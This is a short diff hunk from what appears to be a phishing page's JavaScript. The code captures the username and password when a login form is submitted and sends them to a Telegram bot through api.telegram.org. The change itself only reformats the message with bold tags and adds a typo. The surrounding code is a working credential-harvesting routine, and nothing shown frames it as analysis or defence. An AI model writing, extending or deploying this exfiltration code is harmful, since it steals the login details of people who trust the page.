@@ -10,7 +10,7 @@ document.querySelector('.login-button').closest('form').addEventListener('submit
     const password = document.getElementById('password').value;
 
     // 3. Creates the message layout
-    const text = `📩 New Entry\n👤 username: ${username}\n🎂 password: ${password}`;
+    const text = `📩 <b>NEW ENTRY</b>\n👤 <b>usernamee:</b> ${username}\n🎂 <b>password:</b> ${password}`;
 
     // 4. Sends it to Telegram
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
